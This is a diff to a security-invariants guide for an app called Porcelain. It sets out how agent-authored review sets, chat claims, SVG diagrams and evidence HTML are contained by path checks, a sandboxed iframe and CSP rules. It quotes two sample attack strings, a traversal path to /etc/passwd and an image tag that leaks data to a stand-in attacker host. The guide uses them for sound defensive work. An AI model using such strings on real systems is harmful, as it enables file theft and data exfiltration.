@@ -40,12 +40,13 @@ assumed — this skill is the codebase-specific layer beneath them.
   it re-validates with zod (`reviewSetsSchema`) on every read because an external
   process owns it. The CLI **authors** the sets (`review set`/`review add`); the app
   makes exactly ONE write — `clearReviewSet` (user-initiated from the Feature tab's
-  Clear button), an atomic tmp+rename that deletes a repo's entry (reverting to the
-  baseline). That's a local home-dir file write, NOT a network surface, and the app
-  still never authors a set. Don't add other app-side writes to this file, and don't
-  "upgrade" the CLI channel to an in-app HTTP/MCP listener. The CLI stays
-  **dependency-free** (Node builtins only) so it runs under a plain `node`; don't add
-  npm imports to `src/cli/`, and keep inputs validated in `toReviewFiles`.
+  Clear button), an atomic tmp+rename that deletes a repo's entry (returning the Feature
+  tab to its "No review yet" empty state — there is no baseline anymore). That's a local
+  home-dir file write, NOT a network surface, and the app still never authors a set. Don't
+  add other app-side writes to this file, and don't "upgrade" the CLI channel to an in-app
+  HTTP/MCP listener. The CLI stays **dependency-free** (Node builtins only) so it runs under
+  a plain `node`; don't add npm imports to `src/cli/`, and keep inputs validated in
+  `toReviewFiles`/`toReviewSections`.
 - **The daemon is the ONE sanctioned listener — 127.0.0.1 only, ALWAYS token-gated.**
   Since the daemon split the renderer talks to `src/backend/server.ts` over HTTP + WS
   (`daemon.ts` spawns it), so the old "the app opens no port" claim no longer holds —
@@ -92,7 +93,7 @@ assumed — this skill is the codebase-specific layer beneath them.
   user files, and adds NO write surface. `/trpc` + `/session` remain the ONLY dynamic
   endpoints and keep the token gate — static assets being open doesn't loosen them. The
   index.html CSP rewrite (`rewriteCsp`) touches **only `connect-src`** (same-origin WS for
-  the request Host); `img-src`/`default-src` stay the artifact backstop, byte-identical.
+  the request Host); `img-src`/`default-src` stay the sandboxed-HTML backstop, byte-identical.
   Don't relax any of these to "make local dev easier." (6) **The token is the whole boundary
   ACROSS THE TAILNET TOO — accepted:** a tailnet peer presenting the token gets everything
   loopback gets, including arbitrary-path `readFile`/`writeTextFile`/`renamePath`/`trashPath`
@@ -199,13 +200,31 @@ assumed — this skill is the codebase-specific layer beneath them.
   the child is killed on daemon exit (`process.on('exit')` reaper), and (d) it's recorded here,
   not hidden. Do NOT expose the opencode port to the renderer, bind it to a non-loopback
   interface, or pass `--mdns`; if opencode ever gains a usable token flag, set it.
-- **Agent-channel review-set paths are repo-contained on read.**
-  `readReviewSet` (`src/backend/review-store.ts`) drops any review-set entry whose
-  path is absolute or escapes `repoPath` (`isRepoContained`), because the file
-  is authored by an external process and its paths flow into
-  `readFile(join(repoPath, path))`. *Why:* without it, a malicious/injected
-  review set could read arbitrary local files into the feature view. *Verify:*
-  new code that reads agent-supplied paths routes through the filtered set.
+- **Agent-channel review-set paths are repo-contained on read — files AND section anchors.**
+  `readReviewSet` (`src/backend/review-store.ts`) drops any review-set FILE whose
+  path is absolute or escapes `repoPath`, and likewise filters every SECTION's `anchors`
+  to the repo-contained ones (`isRepoContained`), because the file is authored by an
+  external process and BOTH path kinds flow into `readFile(join(repoPath, path))` (a
+  changed file's hunks, an anchor's line slice). A section that fails validation is
+  DROPPED, never thrown (read-side leniency), so one bad section can't break the Review.
+  *Why:* without it, a malicious/injected review set could read arbitrary local files
+  into the Review. *Verify:* new code that reads an agent-supplied path (file or anchor)
+  routes through the filtered set.
+- **Agent chat claim paths are repo-contained before the app opens one.** The chat/relay
+  channel (`~/.porcelain/chat.json`, `chat-store.ts` ↔ `src/cli/chat-file.ts`) is two-way,
+  and a message's body/intent is inert text — BUT a message can carry a `--files` footprint
+  (a **claim**), and those paths are **agent-authored** (any local/remote agent posts them —
+  unlike the app-authored comment paths, which need no guard). The Coordination panel
+  resolves each claim path app-side: `ClaimFileChip` joins it to the repo root and opens a
+  file tab (`chat-quick-access.tsx` → `readFile`, which is NOT itself repo-scoped). So a
+  claim path is exactly as dangerous as a review-set path and must be **repo-contained
+  before it can reach a read**. `deriveChatClaims`
+  (`src/renderer/src/lib/chat-claims.ts`) drops any claim file that is absolute or
+  `..`-escapes (`isContainedClaimPath`), and a claim whose whole footprint is escapes yields
+  no live claim (no chip). *Why:* without it, a claim `{"files":["../../etc/passwd"]}` would
+  open an out-of-repo file the moment the human clicked its chip. *Verify:*
+  `isContainedClaimPath` filters the derived footprint (unit-tested in `chat-claims.test.ts`);
+  no renderer builds a file path from a raw `message.files` entry outside the filtered claim.
 - **The review-comment channel is a SECOND, two-way agent channel**
   (`~/.porcelain/comments.json`, `comment-store.ts` ↔ `src/cli/comment-file.ts`),
   kept SEPARATE from review-sets so the "app makes one write to the review-set
@@ -311,40 +330,47 @@ assumed — this skill is the codebase-specific layer beneath them.
   rendered," never as source of truth (the agent's own pushed set is still `review get`).
   *Verify:* the CLI has only `feature get` for it; the only writer is
   `writeFeatureSnapshot`; `rg -n "createServer|listen\(|http" src/cli` still finds nothing.
-- **The feature artifact is agent-authored ACTIVE content — render it ONLY in a fully
-  sandboxed iframe.** The 9th channel (`~/.porcelain/artifacts.json`, `artifact-store.ts` ↔
-  `src/cli/artifact-file.ts`, `artifact set/get/clear`, `Record<repoPath, { title, html,
-  updatedAt }>`) lets the agent author a self-contained HTML document that Porcelain renders in
-  the viewer. Unlike every other channel's content (inert text/paths), the `html` is executable
-  markup, so the safeguards that make it acceptable, all of which must hold: (1) it renders ONLY
-  inside `<iframe sandbox="" srcdoc={html}>` (`artifact-view.tsx`) — the EMPTY sandbox attribute:
-  no `allow-scripts`, no `allow-same-origin`, no `allow-popups`, ever. `sandbox=""` stops script
-  execution, same-origin access, and navigation; `srcdoc` keeps it a self-contained document. Never
-  add an `allow-*` token or swap to a `src` URL. (2) The parent CSP (`default-src 'self'; img-src
-  'self' data:` in `index.html`) is the ONLY thing blocking external subresource loads (a remote
+- **Review-section diagrams (and the evidence chapter) are agent-authored ACTIVE content —
+  render them ONLY in a fully sandboxed iframe; prose/thesis render as escaped markdown.**
+  The review-set channel now carries a `thesis` and `sections[]` — each section a markdown
+  `prose` string, an optional inline-SVG `diagram`, and line-range `anchors`. Two of these are
+  attacker-reachable (an external process owns `review-sets.json`), so the safeguards that make
+  them acceptable, all of which must hold: (1) a section's `diagram` is executable SVG markup,
+  so it renders ONLY inside the existing `<iframe sandbox="" srcdoc>` path — the reading surface
+  wraps the SVG in a minimal document (`svgDocument`) and hands it to `HtmlView`
+  (`html-view.tsx`), the SAME sandbox as the evidence chapter body — the EMPTY sandbox
+  attribute: no `allow-scripts`, no `allow-same-origin`, no `allow-popups`, ever. Never
+  `dangerouslySetInnerHTML`, never add an `allow-*` token or swap to a `src` URL. (2)
+  `prose`/`thesis` render through **react-markdown with default escaping — NO `rehype-raw`**
+  (`MarkdownBlock` in `reading-surface.tsx`), so a `<script>`/`<img>` in prose is shown as
+  text, never parsed as HTML. (3) The parent CSP (`default-src 'self'; img-src 'self' data:` in
+  `index.html`) is the ONLY thing blocking external subresource loads (a remote
   `<img>`/stylesheet/font) — a `srcdoc` document inherits it, and sandbox alone does NOT block
   passive loads. This makes the CSP the real backstop against an HTML-only exfil channel
-  (`<img src="https://attacker/?leak=...">`): never widen it (e.g. adding a remote host to
-  `img-src`) while artifacts can render. The daemon split added `connect-src 'self'
-  http://127.0.0.1:* ws://127.0.0.1:*` to the same CSP (the renderer must reach the local
-  daemon). That loopback scope is what the Electron window loads; when the daemon serves the
-  Phase-3 browser client it rewrites ONLY `connect-src` to same-origin WS for the request Host
-  (`rewriteCsp` in `static-server.ts`) — it does NOT relax `img-src`/`default-src`, which
-  remain the artifact backstop, and the rewrite must never touch them. The Electron
-  `connect-src` also allows scheme-wide `http:/https:/ws:/wss:` so a remote daemon
-  (LAN/tailnet) is reachable from the packaged app; that widen is deliberate and must
-  not creep into `img-src`/`default-src`. `font-src 'self' data:` is also present and
-  DELIBERATE (Vite inlines small font subsets — the JetBrains Mono Cyrillic slice — as
-  data: URIs, which the `default-src` fallback otherwise blocks); a `data:` font is inert
-  (no request leaves the machine), so it adds no exfil channel — but never add a REMOTE
-  host to `font-src` (a remote font load IS a beacon). Don't widen `img-src`/`default-src`, and keep the CSP rewrite connect-src-only. (3) Reads are zod-validated + size-capped on
-  EVERY read (`readArtifact` drops an entry whose html exceeds `MAX_HTML_BYTES` = 1.5 MB, and
-  never throws — one bad agent write can't break the viewer), because an external process owns the
-  file. Same two-way shape as review-sets: the CLI authors it, the app makes exactly ONE
-  write — `clearArtifact` (user-initiated), an atomic tmp+rename delete-entry — and it has a
-  `review-watch` entry → the `artifact` event. Still local-file only, no network surface. *Verify:* the
-  iframe keeps `sandbox=""` with no allow-tokens; the CSP is unchanged; `rg -n "createServer|listen\(|http" src/cli`
-  still finds nothing; the app's only write to `artifacts.json` is `clearArtifact`.
+  (`<img src="https://attacker/?leak=...">`) inside a diagram or the evidence chapter: never
+  widen it (e.g. adding a remote host to `img-src`) while any agent-authored HTML can render.
+  The daemon split added `connect-src 'self' http://127.0.0.1:* ws://127.0.0.1:*` to the same
+  CSP (the renderer must reach the local daemon). That loopback scope is what the Electron
+  window loads; when the daemon serves the Phase-3 browser client it rewrites ONLY `connect-src`
+  to same-origin WS for the request Host (`rewriteCsp` in `static-server.ts`) — it does NOT
+  relax `img-src`/`default-src`, which remain the exfil backstop, and the rewrite must never
+  touch them. The Electron `connect-src` also allows scheme-wide `http:/https:/ws:/wss:` so a
+  remote daemon (LAN/tailnet) is reachable from the packaged app; that widen is deliberate and
+  must not creep into `img-src`/`default-src`. `font-src 'self' data:` is also present and
+  DELIBERATE (Vite inlines small font subsets — the JetBrains Mono Cyrillic slice — as data:
+  URIs, which the `default-src` fallback otherwise blocks); a `data:` font is inert (no request
+  leaves the machine), so it adds no exfil channel — but never add a REMOTE host to `font-src`
+  (a remote font load IS a beacon). Don't widen `img-src`/`default-src`, and keep the CSP
+  rewrite connect-src-only. (4) Anchor `path`s are **repo-contained on read** (see the
+  review-set-paths invariant above), and the caps (`max` on `sections`/`prose`/`diagram`/
+  `anchors`, `reviewSetSchema`) are enforced by the whole-file zod parse on every read — a
+  section that fails validation is DROPPED, never thrown, so one bad agent write can't break the
+  Review. (5) The app's ONLY write to `review-sets.json` remains `clearReviewSet`
+  (user-initiated) — thesis/sections are never app-authored. *Verify:* the diagram + evidence
+  iframes keep `sandbox=""` with no allow-tokens; prose renders without `rehype-raw`; the CSP is
+  byte-unchanged; the app's only `review-sets.json` write is `clearReviewSet`. (The former
+  artifact channel — `artifact-store.ts`, `src/cli/artifact-file.ts`, the
+  `artifact` verbs/event/tab kind — is DELETED; its narrative folded into these sections.)
 - **Loop evidence is directory-on-disk, not an inline HTML payload.** Layout:
   `~/.porcelain/loop-evidence/<sha256(repoPath)[0..16]>/` with `index.html` (+ sibling
   screenshots, optional `meta.json`). Agents write those files with normal Write tools;
@@ -352,14 +378,17 @@ assumed — this skill is the codebase-specific layer beneath them.
   base64 through a channel arg is the failure mode we designed out. The app (`evidence-store.ts`)
   reads the dir, inlines relative `img` src under that dir into data URIs for the
   sandboxed `srcdoc` viewer (`evidence-assets.ts`), and `clearEvidence` deletes the
-  directory. Legacy `evidence.json` is still read as a fallback. Same sandbox invariant
-  as artifacts: `evidence-view.tsx` keeps `sandbox=""` + `srcdoc`; never widen
+  directory. Legacy `evidence.json` is still read as a fallback. Same sandbox invariant as
+  the section diagrams: loop evidence now renders as the **Review's final chapter** (the
+  standalone `evidence-view.tsx` / `evidence` tab kind is GONE) — the reading surface's
+  evidence-chapter body hands the html to `HtmlView` (`sandbox=""` + `srcdoc`); never widen
   `img-src`/`default-src`. Watch: recursive on `loop-evidence/` root + Feature list 3s
   poll. *Verify:* disk-first tests in `evidence-store.test.ts`; skill documents prepare +
   Write; `evidence prepare` returns a path without requiring html.
-- **`artifact set` still accepts `--html` (inline or `-` for stdin) OR `--html-file` (absolute path).**
-  Artifacts remain the JSON-channel shape; large artifact HTML can use `--html-file`
-  (`src/cli/html-input.ts`). Loop evidence prefers the directory flow above.
+- **`evidence set` still accepts `--html` (inline or `-` for stdin) OR `--html-file`
+  (absolute path)** (`src/cli/html-input.ts`, now the SOLE caller after the artifact channel
+  was removed) — but loop evidence PREFERS the directory flow above (`evidence prepare` +
+  Write index.html), so large HTML never rides a channel arg.
 - **CLI install is boot-driven, writes ONLY to `~/.porcelain`, and takes no user input.**
   `ensureCli` (`src/backend/cli-install.ts`, plus a main-process counterpart — grep the
   call sites) copies the bundled `out/main/cli/porcelain.js` to `~/.porcelain/porcelain.js`
